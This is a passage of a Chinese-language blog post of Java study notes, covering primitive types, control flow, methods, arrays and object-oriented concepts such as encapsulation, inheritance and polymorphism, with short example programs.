align="center"></td></tr><tr><td align="center">short</td><td align="center">2字节</td><td align="center"></td></tr><tr><td align="center">int</td><td align="center">4字节</td><td align="center"></td></tr><tr><td align="center">long</td><td align="center">8字节</td><td align="center">以L结尾</td></tr><tr><td align="center">float</td><td align="center">4字节</td><td align="center">以F结尾</td></tr><tr><td align="center">double</td><td align="center">8字节</td><td align="center"></td></tr><tr><td align="center">char</td><td align="center">2字节</td><td align="center">用单引号修饰</td></tr><tr><td align="center">boolean</td><td align="center">1位</td><td align="center">true or false</td></tr></tbody></table><h3 id="整数扩展"><a href="#整数扩展" class="headerlink" title="整数扩展"></a>整数扩展</h3><p>二进制0b，八进制0，十六进制0x。</p><h3 id="浮点数扩展"><a href="#浮点数扩展" class="headerlink" title="浮点数扩展"></a>浮点数扩展</h3><p><strong>最好完全避免使用浮点数进行比较。</strong></p><h3 id="字符扩展"><a href="#字符扩展" class="headerlink" title="字符扩展"></a>字符扩展</h3><p>所有字符的本质还是数字。</p><p>Unicode前缀’\u’。</p><p>对象，从内存分析。</p><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>从低到高，byte, short, char -&gt; int -&gt; long -&gt; float -&gt; double。不同数据类型运算，先转换为同一种。</p><p>强制类型转换：(类型)变量名。自动类型转换，低到高。</p><p>注意：不能对boolean进行转换，不能把对象类型转换为不相干的类型，把高容量转换到低容量的时候是强制转换，转换的时候可能出现精度问题或者内存溢出。</p><p>如果你在Java源码中要处理大数字，你可以在数字中加入下划线来<strong>提高可读性</strong>。使用的时候要注意：在字面常量数字里加下划线是有一定规则的，下划线只能在数字之间，在数字的开始或结束一定不能使用下划线。比如把长整型数字比如10000000000写成一个更具可读性10_000_000_000。</p><h2 id="变量、常量、作用域"><a href="#变量、常量、作用域" class="headerlink" title="变量、常量、作用域"></a>变量、常量、作用域</h2><p>Java是强类型语言，每个变量都必须声明类型。</p><p>声明变量：  <code>数据类型 变量名 = 值;</code></p><p>按作用域分：类变量、实例变量、局部变量。</p><img src="https://img.lfalive.top/Learn-java-base/var.JPG" style="zoom:70%;" /><p>实例变量从属于对象，如果不自行初始化，就是默认值：<strong>0、0.0、false</strong>。除了基本类型，其余都是null。</p><p>类变量关键字<code>static</code>。</p><p>常量可以理解为一种特殊变量。声明：<code>final 常量名 = 值;</code></p><p>常量名一般用大写字符。</p><h3 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h3><p>类成员变量、局部变量、方法名：首字母小写和驼峰原则，即除了第一个单词外，后面的单词首字母大写，如lastName、reRun()。</p><p>常量：大写字母和下划线，如MAX_VALUE。</p><p>类名：首字母大写和驼峰原则，如GoodMan。</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>运算符包括算数运算符、赋值运算符、关系运算符、逻辑运算符、位运算符、条件运算符、扩展赋值运算符。</p><p>注意除法运算中的变量类型问题。</p><p>不存在幂运算符<code>^</code>，幂运算可以使用Math工具类，<code>Math.pow()</code>。<code>^</code>表示异或运算。可以用左移位运算实现乘方。</p><p>有三目运算符 <code>? :</code></p><h2 id="包机制"><a href="#包机制" class="headerlink" title="包机制"></a>包机制</h2><p>package语句放最前面，import语句在其之后。一般使用公司域名倒置作为包名。</p><h2 id="JavaDoc生成文档"><a href="#JavaDoc生成文档" class="headerlink" title="JavaDoc生成文档"></a>JavaDoc生成文档</h2><p>JavaDoc可以写在类上面和方法上面。</p><p>执行命令<em><strong>javadoc xxx.java</strong></em>即可，也可以使用IDEA的JavaDoc生成功能，在菜单 Tools-&gt;Generate JavaDoc项里面。</p><h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><h2 id="用户交互Scanner"><a href="#用户交互Scanner" class="headerlink" title="用户交互Scanner"></a>用户交互Scanner</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基本语法</span></span><br><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="keyword">if</span> (scanner.hasNextLine())&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">    System.out.println(str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 凡是属于IO流的类，如果不关闭，会一直占用资源，尽量用完就关掉。</span></span><br><span class="line">scanner.close();</span><br></pre></td></tr></table></figure><p><code>next()</code>：读取到有效字符后才可以结束输入，将有效字符后面的空白作为分隔符或者结束符，不能得到带有空格的字符串。</p><p><code>nextLine()</code>：读取输入回车之前的所有字符，可以获得空白。</p><p>还有各种类型的<code>nextxxxx()</code>和<code>hasNextxxxx()</code>方法。</p><h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// if选择结构</span></span><br><span class="line"><span class="keyword">if</span> (condition1)&#123;</span><br><span class="line">    statement1;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition2)&#123;</span><br><span class="line">    statement2;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    statement3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// switch选择结构，匹配一个具体的值</span></span><br><span class="line"><span class="comment">// case穿透，记得加break</span></span><br><span class="line"><span class="keyword">switch</span> (n)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;wtf&quot;</span>:</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;omg&quot;</span>:</span><br><span class="line">        System.out.println(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        System.out.println(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IDEA可以反编译class文件，如下图。</p><p><img src="https://img.lfalive.top/Learn-java-base/decompiled.JPG"></p><h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// while循环</span></span><br><span class="line"><span class="keyword">while</span> (condition)&#123;</span><br><span class="line">    statement;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// do……while循环</span></span><br><span class="line"><span class="comment">// 保证statement至少执行一次</span></span><br><span class="line"><span class="comment">// while是先判断后执行，dowhile是先执行后判断</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    statement;</span><br><span class="line">&#125; <span class="keyword">while</span> ();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// for循环</span></span><br><span class="line"><span class="keyword">for</span> (初始值; bool表达式; 迭代)&#123;</span><br><span class="line">    statement;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 增强for循环</span></span><br><span class="line"><span class="type">int</span>[] num = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> x : num) &#123;</span><br><span class="line">    System.out.println(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>break</code>用于强行跳出循环，不再执行剩余语句。</p><p><code>continue</code>用于终止某次循环过程，接着进行下一次循环是否执行的判定。</p><p><code>goto</code>仍是java的一个保留字，但并未在语言中得到正式使用，在带标签的break和continue中有它的影子。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">outer:</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">2</span>; j &lt;= i; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % j == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span> outer; <span class="comment">// continue外层循环</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><h2 id="何为方法"><a href="#何为方法" class="headerlink" title="何为方法"></a>何为方法</h2><ul><li>方法是解决一类问题的步骤的有序组合</li><li>方法包含于类或对象中</li><li>方法在程序中创建，在其他地方被引用</li><li>最好保持方法的原子性，即一个方法只完成一个功能，便于后期扩展</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 返回值类型 方法名(参数类型 参数名)&#123;</span><br><span class="line">    方法体</span><br><span class="line">    <span class="keyword">return</span> 返回值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用方法：<code>对象名.方法名(实参列表)</code></p><h2 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h2><p>在一个类中，有相同的函数名称，但形参不同的函数。</p><p>规则：    </p><ul><li>方法名称必须相同</li><li>参数列表必须不同（个数、类型、参数排列顺序不同）</li><li>返回类型可同也可不同</li><li>仅仅返回类型不同，不足以构成重载</li></ul><h2 id="命令行传参"><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// example</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    <span class="keyword">for</span> (String arg : args) &#123;</span><br><span class="line">        System.out.println(arg);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>运行<code>java HelloWorld.java this is</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># output</span></span><br><span class="line">this</span><br><span class="line">is</span><br></pre></td></tr></table></figure><h2 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h2><p>在方法声明中，在指定类型后加一个三个点<code>...</code>。一个方法只能有一个可变参数，必须是方法的最后一个参数。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// example</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>... x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i : x) &#123;</span><br><span class="line">        sum += i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明并创建一个数组</span></span><br><span class="line">dataType[] arrayRefVa = <span class="keyword">new</span> <span class="title class_">dataType</span>[arraySize];</span><br></pre></td></tr></table></figure><ul><li>通过索引访问，索引从0开始。</li><li>长度固定，一旦创建，不可改变。</li><li>可以是任何类型，但不允许混合类型。</li><li>数组变量属于引用类型，数组也可以看成是对象，数组中的每个元素相当于该对象的成员变量。</li><li>数组本身就是对象，Java中对象是在堆中的，因此数组无论保存原始类型还是其他对象类型，<strong>数组对象本身是在堆中的</strong>。</li></ul><h2 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h2><p><strong>Java内存：</strong></p><ul><li>堆：存放new的对象和数组，可以被所有的线程共享，不会存放别的对象引用。</li><li>栈：存放基本变量类型（会包含具体数值），引用对象的变量（会存放这个引用在堆里面的具体地址）。</li><li>方法区：可以被所有线程共享，包含了所有的class和static变量。</li></ul><p><img src="https://img.lfalive.top/Learn-java-base/new_list.JPG"></p><h2 id="三种初始化"><a href="#三种初始化" class="headerlink" title="三种初始化"></a>三种初始化</h2><img src="https://img.lfalive.top/Learn-java-base/initialize.JPG" style="zoom: 80%;" /><p><strong>默认初始化：</strong>数组是引用类型，它的元素相当于类的实例变量，因此数组一经分配空间，其中的每个元素也被按照实例变量同样的方式被隐式初始化。</p><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><p>即数组的数组。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[][] array = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">3</span>,<span class="number">4</span>&#125;&#125;;</span><br></pre></td></tr></table></figure><h2 id="Arrays类"><a href="#Arrays类" class="headerlink" title="Arrays类"></a>Arrays类</h2><p>数组工具类java.util.Arrays中的方法都是static修饰的静态方法，在使用的时候可以直接使用类名进行调用。而不用（不是不能）使用对象来调用。看文档了解常用的<code>fill</code>、<code>toString</code>、<code>sort</code>等方法。</p><h2 id="稀疏数组"><a href="#稀疏数组" class="headerlink" title="稀疏数组"></a>稀疏数组</h2><p>当一个数组中大部分为同一值时，可以使用稀疏数组来保存该数组。把具有不同值的元素和行列及值记录在一个小规模的数组中，从而缩小程序的规模。</p><img src="https://img.lfalive.top/Learn-java-base/SparseArray.JPG" style="zoom:70%;" /><p>上图中第一行row表示原矩阵行数，col表示原矩阵列数，value&#x3D;8表示共有8个有效值，稀疏数组长度为8+1&#x3D;9。</p><h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><p>对于描述复杂事物，为了从宏观上把握，从整体上合理分析，我们需要使用面向对象的思路来分析整个系统。但是，具体到微观操作，仍然需要面向过程的思路去处理。</p><p>面向对象编程<strong>（OOP）</strong>本质是<strong>以类的方式组织代码，以对象的形式封装数据。</strong></p><p><strong>三大特性：封装，继承，多态。</strong></p><h2 id="静态方法和非静态方法"><a href="#静态方法和非静态方法" class="headerlink" title="静态方法和非静态方法"></a>静态方法和非静态方法</h2><p><code>static</code>静态方法，和类一起加载的。非静态方法需要类实例化之后才存在，才能使用。</p><h2 id="值传递和引用传递"><a href="#值传递和引用传递" class="headerlink" title="值传递和引用传递"></a>值传递和引用传递</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引用传递：对象，本质还是值传递。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">myself</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        System.out.println(myself.name);</span><br><span class="line">        changeName(myself);</span><br><span class="line">        System.out.println(myself.name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">changeName</span><span class="params">(Person person)</span>&#123;</span><br><span class="line">        person.name = <span class="string">&quot;Jack&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="comment">// 对象的属性</span></span><br><span class="line">    String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># output</span></span><br><span class="line">null</span><br><span class="line">Jack</span><br></pre></td></tr></table></figure><h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><p>类是对某一类事物整体的描述&#x2F;定义，但是并不能代表某一个具体的事物。</p><p>对象是抽象概念的具体实例。 </p><p>创建的时候，使用<code>new</code>关键字，会分配内存空间，还会给创建好的对象进行默认的初始化以及对类中构造器的调用。</p><p>一个项目应该只有一个main方法。</p><h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2><p>类中的构造器又称构造方法，必须和类的名字同名，必须没有返回类型，也不能写<code>void</code>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name + <span class="string">&quot; is studying.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// example</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">myself</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;lfalive&quot;</span>);</span><br><span class="line">System.out.println(myself.name);</span><br><span class="line">myself.study();</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># output</span></span><br><span class="line">lfalive</span><br><span class="line">lfalive is studying.</span><br></pre></td></tr></table></figure><p>定义有参构造之后，如果想使用无参构造，显式地定义一个无参的构造。</p><h2 id="内存分析-1"><a href="#内存分析-1" class="headerlink" title="内存分析"></a>内存分析</h2><p><img src="https://img.lfalive.top/Learn-java-base/OOP_memory.JPG"></p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p><strong>高内聚，低耦合</strong>：内部数据操作细节自己完成，仅暴露少量的方法给外部使用。</p><p><strong>封装（数据的隐藏）</strong>：通常应禁止直接访问一个对象中数据的实际表示，而应通过操作接口来访问、</p><p>属性私有：<code>private</code>关键字。通常提供一些可以操作这个属性的方法，例如<code>public</code>的get、set方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// example</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">myself</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">myself.setName(<span class="string">&quot;lfalive&quot;</span>);</span><br><span class="line">System.out.println(myself.getName());</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># output</span></span><br><span class="line">lfalive</span><br></pre></td></tr></table></figure><p><strong>总结：属性私有，get&#x2F;set。</strong></p><p>属性级别：<code>public</code>、<code>protected</code>、<code>default</code>、<code>private</code>。</p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>继承是类和类之间的一种关系。子类继承父类（包括父类的所有方法），使用关键字<code>extend</code>来表示。</p><p>在Java中，所有类都默认直接或者间接继承Object。</p><p>Java中只有单继承，没有多继承。 </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// example</span></span><br><span class="line"><span class="comment">// 继承了上例中的Person类，可以使用getName和setName方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>super</code>调用父类的属性和方法。私有的东西无法被继承，即<code>super</code>不能调用父类的<code>private</code>方法。</p><p>new一个子类对象时，会先执行<code>super()</code>，调用父类的无参构造。即<code>super()</code>方法是调用父类的构造器，必须要在子类构造器的第一行。默认调用的是父类的无参构造，如果父类没有无参构造，就会报错。<code>super</code>和<code>this</code>不能同时调用构造方法。</p><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><h3 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h3><p>重写都是方法的重写，和属性无关。</p><p>父类的引用可以指向子类。例如<code>Person you = new Student();</code>。</p><p><strong>静态方法是类的方法，非静态方法是对象的方法。</strong>对于上例而言，因为<code>you</code>是<code>Student</code>new出来的对象，因此在有<code>static</code>时，<code>you</code>调用了<code>Person</code>类的方法，没有<code>static</code>时，<code>you</code>调用的是对象的方法，即<code>Student</code>的方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">you</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        you.test();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">myself</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        myself.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;person test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// 子类重写了父类的方法，和非静态方法有关，private方法不能重写。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;student test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重写注意事项</p><ol><li>重写的方法可以使用 <strong>@Override</strong> 注解来标识。</li><li><strong>构造方法</strong>不能被重写。</li><li>声明为 <strong>final</strong> 的方法不能被重写。</li><li>子类和父类在同一个包中时，子类可以重写父类除了声明为 <strong>private</strong> 和 <strong>final</strong> 方法的其他方法。</li><li>子类和父类不在同一个包中时，子类只能重写父类的声明为 <strong>public</strong> 和 <strong>protected</strong> 的非 <strong>final</strong> 方法。</li><li>如果不能继承一个方法，则不能重写这个方法。重写是在继承的基础上，如果方法无法被继承那么就无法重写</li><li>方法名、参数列表必须相同</li><li>修饰符：范围可以扩大，不能缩小：public&gt;protected&gt;default&gt;private</li><li>抛出的异常：范围可以被缩小，不能被扩大：ClassNotFound –&gt; Exception</li></ol><p>为什么需要重写：父类的功能，子类不一定需要，或者不一定满足。</p><h3 id="instanceof和类型转换"><a href="#instanceof和类型转换" class="headerlink" title="instanceof和类型转换"></a>instanceof和类型转换</h3><p>对象能执行哪些方法，主要看对象左边的类型，和右边关系不大。</p><p>子类能调用的方法，都是自己的或者继承父类的。父类不能调用子类独有的方法。</p><p>多态注意事项</p><ul><li>多态是方法的多态，属性没有多态</li><li>父类和子类有联系，类型转换异常为ClassCastException</li><li>存在条件：继承关系，方法需要重写（but有些方法不能被重写，见上文），父类引用指向子类对象<code>Father f1 = new Son();</code></li></ul><p><code>instanceof</code>判断一个对象是否是特定类的一个实例。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// example</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// Object &gt; String</span></span><br><span class="line">        <span class="comment">// Object &gt; Person &gt; Teacher</span></span><br><span class="line">        <span class="comment">// Object &gt; Person &gt; Student</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        System.out.println(s1 <span class="keyword">instanceof</span> Student);</span><br><span class="line">        System.out.println(s1 <span class="keyword">instanceof</span> Person);</span><br><span class="line">        System.out.println(s1 <span class="keyword">instanceof</span> Object);</span><br><span class="line">        System.out.println(s1 <span class="keyword">instanceof</span> Teacher);</span><br><span class="line">        System.out.println(s1 <span class="keyword">instanceof</span> String);</span><br><span class="line">        System.out.println(<span class="string">&quot;=================================&quot;</span>);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        System.out.println(s2 <span class="keyword">instanceof</span> Student);</span><br><span class="line">        System.out.println(s2 <span class="keyword">instanceof</span> Person);</span><br><span class="line">        System.out.println(s2 <span class="keyword">instanceof</span> Object);</span><br><span class="line">        System.out.println(s2 <span class="keyword">instanceof</span> Teacher);</span><br><span class="line">        <span class="comment">// System.out.println(s2 instanceof String); // 编译报错</span></span><br><span class="line">        System.out.println(<span class="string">&quot;=================================&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        System.out.println(s3 <span class="keyword">instanceof</span> Student);</span><br><span class="line">        System.out.println(s3 <span class="keyword">instanceof</span> Person);</span><br><span class="line">        System.out.println(s3 <span class="keyword">instanceof</span> Object);</span><br><span class="line">        <span class="comment">// System.out.println(s3 instanceof Teacher); // 编译报错</span></span><br><span class="line">        <span class="comment">// System.out.println(s3 instanceof String); // 编译报错</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Teacher</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># output</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line">=================================</span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line">=================================</span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure><p><code>System.out.println(X instanceof Y);</code>能不能编译通过，就看X和Y之间有没有父子关系。</p><p>类型之间的转换：父对象可以使用括号强制转换为子对象。子类转换为父类不用强制转换，但可能丢失一些自己本来的方法。可以方便方法的调用，减少重复的代码！</p><h2 id="static关键字详解"><a href="#static关键字详解" class="headerlink" title="static关键字详解"></a>static关键字详解</h2><h3 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// example</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;匿名代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;==================&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">    &#125;</span><br><span 